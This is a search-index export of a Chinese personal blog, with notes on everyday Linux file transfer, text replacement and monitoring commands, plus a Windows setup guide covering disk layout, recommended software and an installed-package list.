tar -xzvf dist.tgz # 解压到指定文件夹 tar Cxzvf /dist dist.tgz # 打包隐藏文件 # 通过 . 可以打包到隐藏文件 tar -czvf dist.tgz /dad/path/. # 通过上级目录来打包 tar -czvf dist.tgz /data/path # 如果是在当前目录，可以手动指定 tar -czvf dist.tgz tar -zcvf dist.tgz .[!.]* * ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:23","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#压缩解压-tar"},{"categories":["blog"],"content":" 拷贝文件 lftp ftp_user_test = '用户名,密码' ftp_url = 'ip:21' source = '/a/b/c' target = './c' # 最大重试2次 # 一次传输20个文件,断点续传 lftp -u ${env.ftp_webgl} ftp://${env.ftp_url} -e \"set ssl:verify-certificate no; set net:max-retries 2; set pget:default-n 20; mirror --continue --verbose ${env.source} ${env.target}; quit\" scp简单高效, 日常使用. 只支持文件名 # 本地到远程 scp /path/thing root@10.10.10.10:/path/thing # 远程到本地 # -r遍历 # -C压缩 sshpass -p 密码 -o StrictHostKeyChecking=no scp -Cr root@10.10.10.10:/taget/path/file /source/path/file # 使用sshpass免密一条命令 # scp支持所有ssh的参数 # StrictHostKeyChecking 第一次连接会需要输入yes,禁用掉它. # UserKnownHostsFile 这次的配置丢弃掉,表示临时使用.避免安全问题. /usr/bin/sshpass -p 密码 /usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@1.1.1.1:/tmp/t1/1 /tmp/t1/1 rsync通常用于增量传输. # 把1这个文件/文件夹 拷贝到远程的/tmp/t1/下面 # at保持文件信息不变 # VP显示进度 # -z 可以开启压缩 rsync -atvP /tmp/t1/1 root@1.1.1.1:/tmp/t1/ # 也支持sshpass /usr/bin/sshpass -p 密码 rsync -atvP -e \"ssh -o StrictHostKeyChecking=no\" /tmp/t1/1 root@1.1.1.1:/tmp/t1/ ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:24","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#拷贝文件"},{"categories":["blog"],"content":" 拷贝文件 lftp ftp_user_test = '用户名,密码' ftp_url = 'ip:21' source = '/a/b/c' target = './c' # 最大重试2次 # 一次传输20个文件,断点续传 lftp -u ${env.ftp_webgl} ftp://${env.ftp_url} -e \"set ssl:verify-certificate no; set net:max-retries 2; set pget:default-n 20; mirror --continue --verbose ${env.source} ${env.target}; quit\" scp简单高效, 日常使用. 只支持文件名 # 本地到远程 scp /path/thing root@10.10.10.10:/path/thing # 远程到本地 # -r遍历 # -C压缩 sshpass -p 密码 -o StrictHostKeyChecking=no scp -Cr root@10.10.10.10:/taget/path/file /source/path/file # 使用sshpass免密一条命令 # scp支持所有ssh的参数 # StrictHostKeyChecking 第一次连接会需要输入yes,禁用掉它. # UserKnownHostsFile 这次的配置丢弃掉,表示临时使用.避免安全问题. /usr/bin/sshpass -p 密码 /usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@1.1.1.1:/tmp/t1/1 /tmp/t1/1 rsync通常用于增量传输. # 把1这个文件/文件夹 拷贝到远程的/tmp/t1/下面 # at保持文件信息不变 # VP显示进度 # -z 可以开启压缩 rsync -atvP /tmp/t1/1 root@1.1.1.1:/tmp/t1/ # 也支持sshpass /usr/bin/sshpass -p 密码 rsync -atvP -e \"ssh -o StrictHostKeyChecking=no\" /tmp/t1/1 root@1.1.1.1:/tmp/t1/ ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:24","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#lftp"},{"categories":["blog"],"content":" 拷贝文件 lftp ftp_user_test = '用户名,密码' ftp_url = 'ip:21' source = '/a/b/c' target = './c' # 最大重试2次 # 一次传输20个文件,断点续传 lftp -u ${env.ftp_webgl} ftp://${env.ftp_url} -e \"set ssl:verify-certificate no; set net:max-retries 2; set pget:default-n 20; mirror --continue --verbose ${env.source} ${env.target}; quit\" scp简单高效, 日常使用. 只支持文件名 # 本地到远程 scp /path/thing root@10.10.10.10:/path/thing # 远程到本地 # -r遍历 # -C压缩 sshpass -p 密码 -o StrictHostKeyChecking=no scp -Cr root@10.10.10.10:/taget/path/file /source/path/file # 使用sshpass免密一条命令 # scp支持所有ssh的参数 # StrictHostKeyChecking 第一次连接会需要输入yes,禁用掉它. # UserKnownHostsFile 这次的配置丢弃掉,表示临时使用.避免安全问题. /usr/bin/sshpass -p 密码 /usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@1.1.1.1:/tmp/t1/1 /tmp/t1/1 rsync通常用于增量传输. # 把1这个文件/文件夹 拷贝到远程的/tmp/t1/下面 # at保持文件信息不变 # VP显示进度 # -z 可以开启压缩 rsync -atvP /tmp/t1/1 root@1.1.1.1:/tmp/t1/ # 也支持sshpass /usr/bin/sshpass -p 密码 rsync -atvP -e \"ssh -o StrictHostKeyChecking=no\" /tmp/t1/1 root@1.1.1.1:/tmp/t1/ ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:24","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#scp"},{"categories":["blog"],"content":" 拷贝文件 lftp ftp_user_test = '用户名,密码' ftp_url = 'ip:21' source = '/a/b/c' target = './c' # 最大重试2次 # 一次传输20个文件,断点续传 lftp -u ${env.ftp_webgl} ftp://${env.ftp_url} -e \"set ssl:verify-certificate no; set net:max-retries 2; set pget:default-n 20; mirror --continue --verbose ${env.source} ${env.target}; quit\" scp简单高效, 日常使用. 只支持文件名 # 本地到远程 scp /path/thing root@10.10.10.10:/path/thing # 远程到本地 # -r遍历 # -C压缩 sshpass -p 密码 -o StrictHostKeyChecking=no scp -Cr root@10.10.10.10:/taget/path/file /source/path/file # 使用sshpass免密一条命令 # scp支持所有ssh的参数 # StrictHostKeyChecking 第一次连接会需要输入yes,禁用掉它. # UserKnownHostsFile 这次的配置丢弃掉,表示临时使用.避免安全问题. /usr/bin/sshpass -p 密码 /usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@1.1.1.1:/tmp/t1/1 /tmp/t1/1 rsync通常用于增量传输. # 把1这个文件/文件夹 拷贝到远程的/tmp/t1/下面 # at保持文件信息不变 # VP显示进度 # -z 可以开启压缩 rsync -atvP /tmp/t1/1 root@1.1.1.1:/tmp/t1/ # 也支持sshpass /usr/bin/sshpass -p 密码 rsync -atvP -e \"ssh -o StrictHostKeyChecking=no\" /tmp/t1/1 root@1.1.1.1:/tmp/t1/ ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:24","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#rsync"},{"categories":["blog"],"content":" 筛选替换 # -r遍历 当前目录,筛选所有带有kentxxq的文件 # 替换old-a成new-b sed -i 's/old-a/new-b/g' `grep kentxxq -rl ./` # 文件替换 sed -i 's#/etc/nginx/ssl/kentxxq.key#/usr/local/nginx/conf/ssl/kentxxq.key#g' * ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:25","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#筛选替换"},{"categories":["blog"],"content":" 系统监控","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:5:0","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#系统监控"},{"categories":["blog"],"content":" 信息查询 # 系统信息 lsb_release -a LSB Version: :core-4.1-amd64:core-4.1-noarch Distributor ID: CentOS Description: CentOS Linux release 8.0.1905 (Core) Release: 8.0.1905 Codename: Core # cpu信息 cat /proc/cpuinfo # 内存信息,2个16g代表32gb内存,双通道 # 或 cat /proc/meminfo # 或 dmidecode -t memory dmidecode | grep -A16 \"Memory Device\" | grep \"Size\" |sed 's/^[ \\t]*//' # 磁盘信息 fdisk -l # 系统os错误代码查询 perror 24 OS error code 24: Too many open files # 服务器型号 dmidecode | grep 'Product Name' # 主板序列号 dmidecode | grep 'Serial Number' # 系统序列号 dmidecode -s system-serial-number # oem信息 dmidecode -t 11 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:5:1","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#信息查询"},{"categories":["blog"],"content":" 状态监控 整体概况 top htop 文件与进程 lsof # 查看指定用户 lsof -u root | less # 查看除指定用户外 lsof -u ^root # 查看指定目录 lsof +D /usr/local/ # 查看某进程 lsof -p 3738 # 查看所有网络 lsof -i # 查看所有tcp lsof -i tcp # 排序句柄 数量-pid lsof -n |awk '{print $2}'|sort|uniq -c |sort -nr|less 内存 # 查看内存使用状态 free -m # 查看内存变化 vmstat 间隔 监控次数 vmstat 2 2 硬盘 # 磁盘分区等情况 fdisk -l # 硬盘监控 # -o 只显示活动中的 # -P 显示进程相关,而不是线程 iotop -oP 网络 # 用来进行查看各个网卡的总流量 nload # 用来监控各个进程的流量使用情况 nethogs # 图形化的工具，可以查看具体的端口情况 iptraf-ng # 各状态tcp连接统计 netstat -n | awk '/^tcp/ {++state[$NF]} END {for(key in state) print key,\"\\t\",state[key]}' # 外部ip连接最多的20条记录 netstat -ant | awk '/^tcp/ {split($5, a, \":\"); count[a[1]]++} END {for (ip in count) print ip \"\\t\" count[ip]}' | sort -nrk2 | head -n 20 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:5:2","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#状态监控"},{"categories":["blog"],"content":" 状态监控 整体概况 top htop 文件与进程 lsof # 查看指定用户 lsof -u root | less # 查看除指定用户外 lsof -u ^root # 查看指定目录 lsof +D /usr/local/ # 查看某进程 lsof -p 3738 # 查看所有网络 lsof -i # 查看所有tcp lsof -i tcp # 排序句柄 数量-pid lsof -n |awk '{print $2}'|sort|uniq -c |sort -nr|less 内存 # 查看内存使用状态 free -m # 查看内存变化 vmstat 间隔 监控次数 vmstat 2 2 硬盘 # 磁盘分区等情况 fdisk -l # 硬盘监控 # -o 只显示活动中的 # -P 显示进程相关,而不是线程 iotop -oP 网络 # 用来进行查看各个网卡的总流量 nload # 用来监控各个进程的流量使用情况 nethogs # 图形化的工具，可以查看具体的端口情况 iptraf-ng # 各状态tcp连接统计 netstat -n | awk '/^tcp/ {++state[$NF]} END {for(key in state) print key,\"\\t\",state[key]}' # 外部ip连接最多的20条记录 netstat -ant | awk '/^tcp/ {split($5, a, \":\"); count[a[1]]++} END {for (ip in count) print ip \"\\t\" count[ip]}' | sort -nrk2 | head -n 20 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:5:2","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#整体概况"},{"categories":["blog"],"content":" 状态监控 整体概况 top htop 文件与进程 lsof # 查看指定用户 lsof -u root | less # 查看除指定用户外 lsof -u ^root # 查看指定目录 lsof +D /usr/local/ # 查看某进程 lsof -p 3738 # 查看所有网络 lsof -i # 查看所有tcp lsof -i tcp # 排序句柄 数量-pid lsof -n |awk '{print $2}'|sort|uniq -c |sort -nr|less 内存 # 查看内存使用状态 free -m # 查看内存变化 vmstat 间隔 监控次数 vmstat 2 2 硬盘 # 磁盘分区等情况 fdisk -l # 硬盘监控 # -o 只显示活动中的 # -P 显示进程相关,而不是线程 iotop -oP 网络 # 用来进行查看各个网卡的总流量 nload # 用来监控各个进程的流量使用情况 nethogs # 图形化的工具，可以查看具体的端口情况 iptraf-ng # 各状态tcp连接统计 netstat -n | awk '/^tcp/ {++state[$NF]} END {for(key in state) print key,\"\\t\",state[key]}' # 外部ip连接最多的20条记录 netstat -ant | awk '/^tcp/ {split($5, a, \":\"); count[a[1]]++} END {for (ip in count) print ip \"\\t\" count[ip]}' | sort -nrk2 | head -n 20 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:5:2","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#文件与进程-lsof"},{"categories":["blog"],"content":" 状态监控 整体概况 top htop 文件与进程 lsof # 查看指定用户 lsof -u root | less # 查看除指定用户外 lsof -u ^root # 查看指定目录 lsof +D /usr/local/ # 查看某进程 lsof -p 3738 # 查看所有网络 lsof -i # 查看所有tcp lsof -i tcp # 排序句柄 数量-pid lsof -n |awk '{print $2}'|sort|uniq -c |sort -nr|less 内存 # 查看内存使用状态 free -m # 查看内存变化 vmstat 间隔 监控次数 vmstat 2 2 硬盘 # 磁盘分区等情况 fdisk -l # 硬盘监控 # -o 只显示活动中的 # -P 显示进程相关,而不是线程 iotop -oP 网络 # 用来进行查看各个网卡的总流量 nload # 用来监控各个进程的流量使用情况 nethogs # 图形化的工具，可以查看具体的端口情况 iptraf-ng # 各状态tcp连接统计 netstat -n | awk '/^tcp/ {++state[$NF]} END {for(key in state) print key,\"\\t\",state[key]}' # 外部ip连接最多的20条记录 netstat -ant | awk '/^tcp/ {split($5, a, \":\"); count[a[1]]++} END {for (ip in count) print ip \"\\t\" count[ip]}' | sort -nrk2 | head -n 20 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:5:2","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#内存"},{"categories":["blog"],"content":" 状态监控 整体概况 top htop 文件与进程 lsof # 查看指定用户 lsof -u root | less # 查看除指定用户外 lsof -u ^root # 查看指定目录 lsof +D /usr/local/ # 查看某进程 lsof -p 3738 # 查看所有网络 lsof -i # 查看所有tcp lsof -i tcp # 排序句柄 数量-pid lsof -n |awk '{print $2}'|sort|uniq -c |sort -nr|less 内存 # 查看内存使用状态 free -m # 查看内存变化 vmstat 间隔 监控次数 vmstat 2 2 硬盘 # 磁盘分区等情况 fdisk -l # 硬盘监控 # -o 只显示活动中的 # -P 显示进程相关,而不是线程 iotop -oP 网络 # 用来进行查看各个网卡的总流量 nload # 用来监控各个进程的流量使用情况 nethogs # 图形化的工具，可以查看具体的端口情况 iptraf-ng # 各状态tcp连接统计 netstat -n | awk '/^tcp/ {++state[$NF]} END {for(key in state) print key,\"\\t\",state[key]}' # 外部ip连接最多的20条记录 netstat -ant | awk '/^tcp/ {split($5, a, \":\"); count[a[1]]++} END {for (ip in count) print ip \"\\t\" count[ip]}' | sort -nrk2 | head -n 20 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:5:2","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#硬盘"},{"categories":["blog"],"content":" 状态监控 整体概况 top htop 文件与进程 lsof # 查看指定用户 lsof -u root | less # 查看除指定用户外 lsof -u ^root # 查看指定目录 lsof +D /usr/local/ # 查看某进程 lsof -p 3738 # 查看所有网络 lsof -i # 查看所有tcp lsof -i tcp # 排序句柄 数量-pid lsof -n |awk '{print $2}'|sort|uniq -c |sort -nr|less 内存 # 查看内存使用状态 free -m # 查看内存变化 vmstat 间隔 监控次数 vmstat 2 2 硬盘 # 磁盘分区等情况 fdisk -l # 硬盘监控 # -o 只显示活动中的 # -P 显示进程相关,而不是线程 iotop -oP 网络 # 用来进行查看各个网卡的总流量 nload # 用来监控各个进程的流量使用情况 nethogs # 图形化的工具，可以查看具体的端口情况 iptraf-ng # 各状态tcp连接统计 netstat -n | awk '/^tcp/ {++state[$NF]} END {for(key in state) print key,\"\\t\",state[key]}' # 外部ip连接最多的20条记录 netstat -ant | awk '/^tcp/ {split($5, a, \":\"); count[a[1]]++} END {for (ip in count) print ip \"\\t\" count[ip]}' | sort -nrk2 | head -n 20 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:5:2","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#网络"},{"categories":["point"],"content":"vscode 是微软开源的一个文本编辑器, 强大到匹敌 IDE. 要点: 开源免费 插件丰富 社区庞大 跨平台 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/vscode/:0:0","series":null,"tags":["point","vscode"],"title":"vscode","uri":"/posts/%E7%AC%94%E8%AE%B0/point/vscode/#"},{"categories":["point"],"content":"windows 是微软公司开发的操作系统. 要点: 兼容性好 功能最全面 用户最多 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/windows/:0:0","series":null,"tags":["point","windows"],"title":"windows","uri":"/posts/%E7%AC%94%E8%AE%B0/point/windows/#"},{"categories":["blog"],"content":"[[笔记/point/windows|windows]] 现在是我主要使用的桌面平台. 因为我挑选并使用了大量的软件工具, 而且经常会跨多设备工作. 所以这里我记录下来, 也给大家做一个参考.","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/","series":null,"tags":["blog","windows"],"title":"windows的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/"},{"categories":["blog"],"content":" 简介windows 现在是我主要使用的桌面平台. 因为我挑选并使用了大量的软件工具, 而且经常会跨多设备工作. 所以这里我记录下来, 也给大家做一个参考. 与 linux的初始化 目的类似. ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:1:0","series":null,"tags":["blog","windows"],"title":"windows的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#简介"},{"categories":["blog"],"content":" 分区配置1 块盘就 1 个分区. 2 块盘就是 2 个独立分区. 但是间隔放大. 第二个分区为 K 分区, 这样可以中间加盘使用 (家里和公司多个电脑, 方便使用相同的盘符名称) 软件安装: 默认 C:\\Program Files 和 C:\\Program Files (x86) 即可. 重装: 不格盘重装. 文件完全不会被动. 个人资料: 创建一个 vhdx 来保存. 开发: devDrivevhdx 功能用起来. 配置安全中心的异步扫描, 安全 + 性能更好. 游戏: 独立目录, 然后用 subst 挂到到独立的分区. 虚拟机使用 subst 即可. 为什么会有第二块硬盘? 肯定是因为需要更大的空间. 既然空间大, 那就都放这里. 系统盘只放软件和长久使用后产生的垃圾. 减少重装的可能性. 那么游戏和虚拟机的 subst 直接放到这里. 同时 vhdx 也都放这里. 甚至可以做第一块盘内 vhdx 或 subst 的备份盘. ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:2:0","series":null,"tags":["blog","windows"],"title":"windows的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#分区配置"},{"categories":["blog"],"content":" 配置内容 对象 选择 说明 参考 字体 Caskaydia Cove Nerd Font 首先 Cascadia Code 是一个等宽字体, 而 Nerd Font 为其加入了大量图标. GitHub - ryanoasis/nerd-fonts: Iconic font aggregator, collection, \u0026 patcher. 3,600+ icons, 50+ patched fonts: Hack, Source Code Pro, more. Glyph collections: Font Awesome, Material Design Icons, Octicons, \u0026 more #todo/笔记 开启 windows 沙箱 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:3:0","series":null,"tags":["blog","windows"],"title":"windows的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#配置内容"},{"categories":["blog"],"content":" 软件安装","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:4:0","series":null,"tags":["blog","windows"],"title":"windows的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#软件安装"},{"categories":["blog"],"content":" 软件列表 看图 GitHub - d2phap/ImageGlass: 🏞 A lightweight, versatile image viewer 终端 Tabby - a terminal for a more modern age 编码 Visual Studio Code - Code Editing. Redefined 打开超大文本 EmEditor (Text Editor) – Best Text Editor, Code Editor, CSV Editor, Large File Viewer for Windows (Free versions available) clash Apifox - API 文档、调试、Mock、测试一体化协作平台 - 接口文档工具，接口自动化测试工具，接口Mock工具，API文档工具，API Mock工具，API自动化测试工具 钉钉，让进步发生 微信，是一个生活方式 企业微信 JB 全家桶 JetBrains Toolbox App: Manage Your Tools with Ease QQ音乐-千万正版音乐海量无损曲库新歌热歌天天畅听的高品质音乐平台！ 网易云音乐 OneDrive 阿里云盘 WPS-需要关掉网盘,图片关联 抓包 Wireshark · Go Deep 远程 向日葵远程控制软件_远程控制电脑手机_远程桌面连接_远程办公|游戏|运维-贝锐向日葵官网 自动切换主题颜色 GitHub - AutoDarkMode/Windows-Auto-Night-Mode: Automatically switches between the dark and light theme of Windows 10 and Windows 11 GitHub - zhongyang219/TrafficMonitor: 这是一个用于显示当前网速、CPU及内存利用率的桌面悬浮窗软件，并支持任务栏显示，支持更换皮肤。 本地执行 github-actions GitHub - nektos/act: Run your GitHub Actions locally 🚀 查看图片的额外信息 ExifTool by Phil Harvey PowerShell/PowerShell Docker 播放器, 配合配置文件 Global Potplayer 选项=》基本=》保存到 ini 文件=》备份/恢复配置 画图 draw.io 迅雷-构建全球最大的去中心化存储与传输网络 微软官方的进程查看工具 Process Explorer - Sysinternals | Microsoft Learn 截图工具, 配合配置文件 Snipaste Listen 1 音乐播放器 文件夹锁 GitHub - Albert-W/Folder-locker: It a tiny tool to lock your folder without compression. 压缩/解压 GitHub - M2Team/NanaZip: The 7-Zip derivative intended for the modern Windows experience 滴答清单 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:4:1","series":null,"tags":["blog","windows"],"title":"windows的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#软件列表"},{"categories":["blog"],"content":" 特殊软件 UtoolsuTools官网 - 新一代效率工具平台 的内置插件 谷歌翻译, 配置全局关键字 ctrl+q OCR 文字识别 Hosts 切换 Ctools 随机密码 文件、文件夹定位 Linux 命令文档 Json 编辑器 Sql 格式化 本地搜索 配置: 中键去掉无用内容, 保留 - 置顶窗口 Listen 1 快速启动 Wsl 2 distronmananger 快速启动 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:4:2","series":null,"tags":["blog","windows"],"title":"windows的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#特殊软件"},{"categories":["blog"],"content":" 特殊软件 UtoolsuTools官网 - 新一代效率工具平台 的内置插件 谷歌翻译, 配置全局关键字 ctrl+q OCR 文字识别 Hosts 切换 Ctools 随机密码 文件、文件夹定位 Linux 命令文档 Json 编辑器 Sql 格式化 本地搜索 配置: 中键去掉无用内容, 保留 - 置顶窗口 Listen 1 快速启动 Wsl 2 distronmananger 快速启动 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:4:2","series":null,"tags":["blog","windows"],"title":"windows的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#utools"},{"categories":["blog"],"content":" 相关内容 windows系统激活 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:5:0","series":null,"tags":["blog","windows"],"title":"windows的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#相关内容"},{"categories":["blog"],"content":" winget 记录 winget list 名称 ID 版本 可用 源 ----------------------------------------------------------------------------------------------------------------------------------------------- Poe-CHATGPT 07dcc971b42bcacc813c32e0d2d97d63 1.0 XTerminal 1.3.59 0e1444f2-e736-59a6-8826-a4f04175d221 1.3.59 Bitwarden Bitwarden.Bitwarden 2023.10.0 winget BlazorAll.Native 1A7F8FDD-86D4-4635-BCC5-277046190E74_9zz4h110yvjzm 1.0.0.1 阿里云盘 Alibaba.aDrive 4.9.14 winget NanaZip M2Team.NanaZip 2.0.450.0 winget OneCommander 44576milosp.OneCommander_p0rg76fmnrgsm 3.54.1.0 Files 49306atecsolution.FilesUWP_et10x9a9vyk8t 3.0.1.0 Tabby 1.0.201 Eugeny.Tabby 1.0.201 winget Visual Studio Community 2022 Microsoft.VisualStudio.2022.Community 17.7.5 17.7.6 winget kentxxq.Templates.Blazor.Native 882634F4-0C13-45FB-8AE9-87BDDBAFAF14_9zz4h110yvjzm 1.0.0.1 英特尔® 显卡控制中心 AppUp.IntelGraphicsExperience_8j3eq9eme6ctt 1.100.5185.0 Microsoft Clipchamp Clipchamp.Clipchamp_yxz26nhyzhsrt 2.8.1.0 大白菜超级U盘装机工具 DaBaiCai 6.0.2212.3 Docker Desktop Docker.DockerDesktop 4.19.0 4.25.0 winget Everything 1.4.1.1022 (x64) voidtools.Everything 1.4.1.1022 1.4.1.1024 winget FileZilla 3.63.2.1 FileZilla Client 3.63.2.1 Git Git.Git 2.42.0.2 winget Google Chrome Google.Chrome 119.0.6045.106 119.0.6045.124 winget Xshell 7 InstallShield_{2C5F58B0-1BF6-4BD3-A665-C1B5206BDC17} 7.0.0122 Xftp 7 InstallShield_{359A9566-381F-4D9B-8ABE-2D922940149F} 7.0.0119 Fleet JetBrains Toolbox (Fleet) 19c6d2aa-cffe-4484-bab1-bfbdc7ae7aaa 1.26.104 Public Preview GoLand JetBrains Toolbox (Goland) bac7d59c-20cf-4069-a5c0-c7c19bb751c5 2023.2.4 IntelliJ IDEA Ultimate JetBrains Toolbox (IDEA-U) d7b52051-8ca5-4296-a413-67e04668273c 2023.2.4 Rider JetBrains Toolbox (Rider) b97d17ed-def7-42ee-b3a6-5619ca008aa2 2023.2.3 DataGrip JetBrains Toolbox (datagrip) 94917958-ac57-4eb6-ae60-45970f74ab7b 2023.2.3 dotPeek Portable JetBrains Toolbox (dotPeek) c20ff58e-ecb7-4c5d-ae51-edb7eb5ed034 2023.2.3 WPS Office (12.1.0.15712) Kingsoft Office 12.1.0.15712 GnuWin32: Make-3.81 GnuWin32.Make 3.81 winget Microsoft Edge Microsoft.Edge 119.0.2151.44 winget Microsoft Edge Dev Microsoft.Edge.Dev 120.0.2186.2 winget Microsoft Edge Update Microsoft Edge Update 1.3.181.5 Microsoft 